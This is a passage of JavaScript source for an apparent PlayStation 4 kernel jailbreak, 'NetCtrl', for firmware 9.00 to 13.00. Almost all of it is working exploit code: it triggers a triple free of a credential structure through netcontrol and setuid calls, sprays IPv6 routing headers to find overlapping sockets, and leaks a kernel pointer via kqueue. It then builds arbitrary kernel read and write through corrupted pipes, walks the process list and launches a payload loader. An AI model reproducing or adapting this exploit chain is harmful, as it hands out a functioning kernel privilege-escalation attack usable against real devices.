  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    wait_for(iov_recvmsg_workers[i].done, 1);
  }
}

function trigger_uio_readv() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    write64(uio_readv_workers[i].done, 0);
  }
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    write(new BigInt(uio_readv_workers[j].pipe_1), uio_readv_workers[j].signal_buf, 1);
  }
}

function wait_uio_readv() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    wait_for(uio_readv_workers[i].done, 1);
  }
}

function trigger_uio_writev() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    write64(uio_writev_workers[i].done, 0);
  }
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    write(new BigInt(uio_writev_workers[j].pipe_1), uio_writev_workers[j].signal_buf, 1);
  }
}

function wait_uio_writev() {
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    wait_for(uio_writev_workers[i].done, 1);
  }
}

/* ===========================
 *   Initialization (init)
 * ===========================
 */

function init() {
  log('=== PS4 NetCtrl Jailbreak ===');
  log('build: stable-clean');

  FW_VERSION = get_fwversion();
  log('Detected PS4 firmware: ' + FW_VERSION);

  if (FW_VERSION === null) {
    log('Failed to detect PS4 firmware version. Aborting...');
    send_notification('Failed to detect PS4 firmware version.\nAborting...');
    return false;
  }

  // Firmware range check
  var compare_version = (a, b) => {
    var aa = a.split('.');
    var bb = b.split('.');
    var amaj = Number(aa[0]);
    var amin = Number(aa[1]);
    var bmaj = Number(bb[0]);
    var bmin = Number(bb[1]);
    return amaj === bmaj ? amin - bmin : amaj - bmaj;
  };

  if (compare_version(FW_VERSION, '9.00') < 0 ||
      compare_version(FW_VERSION, '13.00') > 0) {
    log('Unsupported PS4 firmware (Supported: 9.00–13.00). Aborting...');
    send_notification('Unsupported PS4 firmware\nAborting...');
    return false;
  }

  kernel_offset = get_kernel_offset(FW_VERSION);
  log('Kernel offsets loaded for FW ' + FW_VERSION);

  return true;
}

/* ===========================
 *   Setup
 * ===========================
 */

var prev_core = -1;
var prev_rtprio = -1;
var cleanup_called = false;

function setup() {
  debug('Preparing netctrl...');

  prev_core = get_current_core();
  prev_rtprio = get_rtprio();

  pin_to_core(MAIN_CORE);
  set_rtprio(MAIN_RTPRIO);

  debug('Pinned to core ' + MAIN_CORE + ' (previous: ' + prev_core + ')');

  // Prepare spray buffer
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);

  // Pre-fill ROP spray buffer (kept for structure)
  for (var i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
  }

  // Prepare msg iov
  write64(msg.add(0x10), msgIov);
  write64(msg.add(0x18), MSG_IOV_NUM);

  // Dummy buffer for uio
  var dummy = malloc(0x1000);
  fill_buffer_64(dummy, new BigInt(0x41414141, 0x41414141), 0x1000);

  write64(uioIovRead.add(0x00), dummy);
  write64(uioIovWrite.add(0x00), dummy);

  // Create socket pairs
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
  uio_sock_0 = read32(uio_sock);
  uio_sock_1 = read32(uio_sock.add(4));

  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
  iov_sock_0 = read32(iov_sock);
  iov_sock_1 = read32(iov_sock.add(4));

  // Create IPv6 sockets
  for (var s = 0; s < ipv6_socks.length; s++) {
    ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
  }

  // Reset pktopts
  free_rthdrs(ipv6_socks);

  // Create pipes for kernel R/W
  pipe(pipe_sock);
  master_pipe[0] = read32(pipe_sock);
  master_pipe[1] = read32(pipe_sock.add(4));

  pipe(pipe_sock);
  victim_pipe[0] = read32(pipe_sock);
  victim_pipe[1] = read32(pipe_sock.add(4));

  masterRpipeFd = master_pipe[0];
  masterWpipeFd = master_pipe[1];
  victimRpipeFd = victim_pipe[0];
  victimWpipeFd = victim_pipe[1];

  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);

  // Create & init workers
  create_workers();
  init_workers();

  debug('Workers spawned: iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
}

/* ===========================
 *   Cleanup
 * ===========================
 */

function cleanup(kill_workers = false) {
  if (cleanup_called) return;
  cleanup_called = true;

  debug('Cleaning up...');

  // Close IPv6 sockets
  for (var i = 0; i < ipv6_socks.length; i++) {
    close(ipv6_socks[i]);
  }

  // Unblock & kill workers
  function release_worker(w) {
    write(new BigInt(w.pipe_1), w.signal_buf, 1);
    if (kill_workers && w.thread_id !== undefined) {
      thr_kill(w.thread_id, 9);
    }
  }

  for (var i = 0; i < IOV_THREAD_NUM; i++) release_worker(iov_recvmsg_workers[i]);
  for (var i = 0; i < UIO_THREAD_NUM; i++) release_worker(uio_readv_workers[i]);
  for (var i = 0; i < UIO_THREAD_NUM; i++) release_worker(uio_writev_workers[i]);
  if (spray_ipv6_worker) release_worker(spray_ipv6_worker);

  // Close main sockets
  close(new BigInt(uio_sock_1));
  close(new BigInt(uio_sock_0));
  close(new BigInt(iov_sock_1));
  close(new BigInt(iov_sock_0));

  // Restore CPU affinity & priority
  if (prev_core >= 0) {
    pin_to_core(prev_core);
    prev_core = -1;
  }

  set_rtprio(prev_rtprio);

  debug('Cleanup completed');
}

/* ===========================
 *   Twins Finder
 * ===========================
 */

function find_twins() {
  var count = 0;
  var zeroMemoryCount = 0;

  var spray_add = spray_rthdr.add(0x04);
  var leak_add = leak_rthdr.add(0x04);

  while (count < MAX_ROUNDS_TWIN) {

    if (debugging.info.memory.available === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 5) {
        log('netctrl failed!');
        cleanup();
        return false;
      }
    } else zeroMemoryCount = 0;

    for (var i = 0; i < ipv6_socks.length; i++) {
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }

    for (var i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
      var val = read32(leak_add);
      var j = val & 0xFFFF;

      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
        twins[0] = i;
        twins[1] = j;
        log('Twins found: [' + i + '] [' + j + ']');
        return true;
      }
    }

    count++;
  }

  log('find_twins failed');
  return false;
}

/* ===========================
 *   Triplet Finder
 * ===========================
 */

function find_triplet(master, other, iterations = MAX_ROUNDS_TRIPLET) {
  var spray_add = spray_rthdr.add(0x04);
  var leak_add = leak_rthdr.add(0x04);

  for (var count = 0; count < iterations; count++) {

    for (var i = 0; i < ipv6_socks.length; i++) {
      if (i === master || i === other) continue;
      write32(spray_add, RTHDR_TAG | i);
      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
    }

    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
    var val = read32(leak_add);
    var j = val & 0xFFFF;

    if ((val & 0xFFFF0000) === RTHDR_TAG &&
        j !== master && j !== other) {
      return j;
    }
  }

  return -1;
}

/* ===========================
 *   Threading Init
 * ===========================
 */

function init_threading() {
  var jmpbuf = malloc(0x60);
  setjmp(jmpbuf);

  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}

/* ===========================
 *   Logging Screen
 * ===========================
 */

var LOG_MAX_LINES = 38;
var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];

function setup_log_screen() {
  jsmaf.root.children.length = 0;

  var bg = new Image({
    url: 'file:///../download0/img/multiview_bg_VAF.png',
    x: 0, y: 0,
    width: 1920, height: 1080
  });

  jsmaf.root.children.push(bg);

  for (var i = 0; i < LOG_COLORS.length; i++) {
    new Style({ name: 'log' + i, color: LOG_COLORS[i], size: 20 });
  }

  var logLines = [];
  var logBuf = [];

  for (var i = 0; i < LOG_MAX_LINES; i++) {
    var line = new jsmaf.Text();
    line.text = '';
    line.style = 'log' + (i % LOG_COLORS.length);
    line.x = 20;
    line.y = 120 + i * 20;
    jsmaf.root.children.push(line);
    logLines.push(line);
  }

  _log = function (msg, screen) {
    if (screen) {
      logBuf.push(msg);
      if (logBuf.length > LOG_MAX_LINES) logBuf.shift();
      for (var i = 0; i < LOG_MAX_LINES; i++) {
        logLines[i].text = i < logBuf.length ? logBuf[i] : '';
      }
    }
    ws.broadcast(msg);
  };
}

/* ===========================
 *   yield_to_render  ← ضعه هنا
 * ===========================
 */

function yield_to_render(callback) {
  var id = jsmaf.setInterval(function () {
    jsmaf.clearInterval(id);
    try {
      callback();
    } catch (e) {
      log('ERROR: ' + e.message);
      cleanup();
    }
  }, 0);
}



/* ===========================
 *   Triple Free Trigger
 * ===========================
 */

function trigger_ucred_triplefree() {
  var end = false;
  write64(msgIov.add(0x0), 1);
  write64(msgIov.add(0x8), 1);

  var main_count = 0;

  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++;

    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    // Register dummy socket
    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);

    close(new BigInt(dummy_socket));

    // Allocate new ucred
    setuid(1);

    // Reclaim FD
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));

    // Free previous ucred
    setuid(1);

    // Unregister dummy socket
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);

    // Reclaim with iov
    for (var i = 0; i < 32; i++) {
      trigger_iov_recvmsg();
      sched_yield();
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
    }

    // Double free ucred
    close(dup(new BigInt(uaf_socket)));

    // Find twins
    end = find_twins();
    if (!end) {
      if (cleanup_called) throw new Error('Netctrl failed - Reboot and try again');
      close(new BigInt(uaf_socket));
      continue;
    }

    log('Triple freeing...');

    // Free one
    free_rthdr(ipv6_socks[twins[1]]);

    var count = 0;
    while (count < 10000) {
      trigger_iov_recvmsg();
      sched_yield();

      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
      if (read32(leak_rthdr) === 1) break;

      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);

      count++;
    }

    if (count === 10000) {
      log('Dropped out from reclaim loop');
      close(new BigInt(uaf_socket));
      continue;
    }

    triplets[0] = twins[0];

    // Triple free
    close(dup(new BigInt(uaf_socket)));

    // Find triplet 1
    triplets[1] = find_triplet(triplets[0], -1);
    if (triplets[1] === -1) {
      log("Couldn't find triplet 1");
      write(new BigInt(iov_sock_1), tmp, 1);
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }

    write(new BigInt(iov_sock_1), tmp, 1);

    // Find triplet 2
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] === -1) {
      log("Couldn't find triplet 2");
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }

    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  if (main_count === TRIPLEFREE_ITERATIONS) {
    log('Failed to Triple Free');
    return false;
  }

  return true;
}

/* ===========================
 *   Leak kqueue
 * ===========================
 */

function leak_kqueue() {
  debug('Leaking kqueue...');

  free_rthdr(ipv6_socks[triplets[1]]);

  var kq = new BigInt(0);
  var magic_val = new BigInt(0x0, 0x1430000);
  var magic_add = leak_rthdr.add(0x08);

  var count = 0;

  while (count < KQUEUE_ITERATIONS) {
    kq = kqueue();

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);

    if (read64(magic_add).eq(magic_val) &&
        !read64(leak_rthdr.add(0x98)).eq(0)) {
      break;
    }

    close(kq);
    sched_yield();
    count++;
  }

  if (count === KQUEUE_ITERATIONS) {
    log('Failed to leak kqueue_fdp');
    return false;
  }

  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp = read64(leak_rthdr.add(0x98));

  if (kq_fdp.eq(0)) {
    log('Failed to leak kqueue_fdp');
    return false;
  }

  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));

  close(kq);

  triplets[1] = find_triplet(triplets[0], triplets[2]);

  return true;
}

/* ===========================
 *   Arbitrary Kernel R/W Setup
 * ===========================
 */

function kreadslow64(address: BigInt) {
  const buffer = kreadslow(address, 8)
  if (buffer.eq(BigInt_Error)) {
    cleanup()
    throw new Error('Netctrl failed - Reboot and try again')
  }
  return read64(buffer)
}

function setup_arbitrary_rw() {
  var fd_files = kreadslow64(kq_fdp);
  fdt_ofiles = fd_files.add(0x00);

  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));

  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));

  write32(master_pipe_buf.add(0x00), 0);
  write32(master_pipe_buf.add(0x04), 0);
  write32(master_pipe_buf.add(0x08), 0);
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE);
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);

  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if (ret_write.eq(BigInt_Error)) {
    cleanup();
    throw new Error('Netctrl failed - Reboot and try again');
  }

  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));

  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
  remove_rthr_from_socket(ipv6_socks[triplets[2]]);

  remove_uaf_file();

  log('Arbitrary R/W achieved');
}

/* ===========================
 *   Jailbreak
 * ===========================
 */

function find_allproc() {
  var pipe_0 = master_pipe[0];
  var pipe_1 = master_pipe[1];

  var pid = Number(getpid());
  write32(sockopt_val_buf, pid);

  ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf);

  var fp = fget(pipe_0);
  var f_data = kread64(fp.add(0x00));
  var pipe_sigio = kread64(f_data.add(0xd0));
  var p = kread64(pipe_sigio);

  kernel.addr.curproc = p;

  var walk_count = 0;
  while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
    p = kread64(p.add(0x08));
    walk_count++;
  }

  return p;
}

function jailbreak() {
  if (!kernel_offset) throw new Error('Kernel offsets not loaded');
  if (FW_VERSION === null) throw new Error('FW_VERSION is null');

  for (var i = 0; i < 10; i++) sched_yield();

  kernel.addr.allproc = find_allproc();

  kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);

  log('Kernel base: ' + hex(kernel.addr.base));

  jailbreak_shared(FW_VERSION);

  log('Jailbreak Complete - JAILBROKEN');
  utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom');

  cleanup(false);
  show_success();
  run_binloader();
}

/* ===========================
 *   Kernel R/W Primitives
 * ===========================
 */

function fhold(fp) {
  kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1);
}

function fget(fd) {
  return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
}

function remove_rthr_from_socket(fd) {
  if (fd > 0) {
    var fp = fget(fd);
    var f_data = kread64(fp.add(0x00));
    var so_pcb = kread64(f_data.add(0x18));
    var in6p_outputopts = kread64(so_pcb.add(0x118));
    kwrite64(in6p_outputopts.add(0x68), new BigInt(0));
  }
}

function remove_uaf_file() {
  if (uaf_socket === undefined) throw new Error('uaf_socket is undefined');

  var uafFile = fget(uaf_socket);
  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));

  var removed = 0;
  for (var i = 0; i < 0x1000; i++) {
    var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    if (fget(s).eq(uafFile)) {
      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
      removed++;
    }
    close(new BigInt(s));
    if (removed === 3) break;
  }
}

/* ===========================
 *   Final Exploit Flow
 * ===========================
 */

var exploit_count = 0;
var exploit_end = false;

function netctrl_exploit() {
  setup_log_screen();

  if (!init()) return;

  log('Setting up exploit...');
  yield_to_render(exploit_phase_setup);
}

function exploit_phase_setup() {
  setup();
  log('Workers spawned');

  exploit_count = 0;
  exploit_end = false;

  yield_to_render(exploit_phase_trigger);
}

function exploit_phase_trigger() {
  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W');
    cleanup();
    return;
  }

  exploit_count++;
  log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');

  if (!trigger_ucred_triplefree()) {
    yield_to_render(exploit_phase_trigger);
    return;
  }

  log('Leaking kqueue...');
  yield_to_render(exploit_phase_leak);
}

function exploit_phase_leak() {
  if (!leak_kqueue()) {
    yield_to_render(exploit_phase_trigger);
    return;
  }

  log('Setting up arbitrary R/W...');
  yield_to_render(exploit_phase_rw);
}

function exploit_phase_rw() {
  setup_arbitrary_rw();
  log('Jailbreaking...');
  yield_to_render(exploit_phase_jailbreak);
}

function exploit_phase_jailbreak() {
  jailbreak();
}
